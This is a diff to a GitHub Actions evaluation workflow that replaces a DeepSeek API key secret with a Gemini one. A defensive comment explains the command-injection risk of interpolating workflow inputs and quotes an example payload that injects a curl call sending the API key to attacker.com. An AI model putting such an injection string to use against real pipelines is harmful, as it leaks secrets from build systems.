@@ -27,7 +27,7 @@ jobs:
       DATABASE_URL: ${{ secrets.EVAL_DATABASE_URL }}
       DIRECT_URL:   ${{ secrets.EVAL_DATABASE_URL }}
       EXA_API_KEY:  ${{ secrets.EVAL_EXA_API_KEY }}
-      DEEPSEEK_API_KEY: ${{ secrets.EVAL_DEEPSEEK_API_KEY }}
+      GEMINI_API_KEY: ${{ secrets.EVAL_GEMINI_API_KEY }}
     steps:
       - uses: actions/checkout@v6
 
@@ -47,7 +47,7 @@ jobs:
         env:
           # Pass workflow_dispatch inputs via env vars so they never enter the
           # shell script via ${{ }} interpolation — that's a command-injection
-          # vector (`"; curl attacker.com/exfil?key=$DEEPSEEK_API_KEY #`).
+          # vector (`"; curl attacker.com/exfil?key=$GEMINI_API_KEY #`).
           EVAL_CASE: ${{ inputs.case }}
           EVAL_REFRESH_SNAPSHOTS: ${{ inputs.refresh_snapshots }}
         run: |
